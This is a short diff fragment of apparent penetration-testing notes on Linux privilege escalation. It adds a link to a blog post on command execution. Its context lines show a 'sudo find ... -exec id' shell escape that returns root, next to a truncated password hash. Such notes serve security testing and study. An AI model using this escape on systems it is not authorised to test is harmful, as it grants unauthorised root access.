@@ -42,6 +42,8 @@ Failed to resolve “root:$6$tacL...
 $ sudo find /dev/null -exec id \; # shell escape
 uid=0(root) gid=0(root) groups=0(root)
 
+http://0x90909090.blogspot.com.au/2015/07/no-one-expect-command-execution.html # moar
+
 ## sudo tests
 * how to test
 cat /opt/path/test.sh <<'EOF'
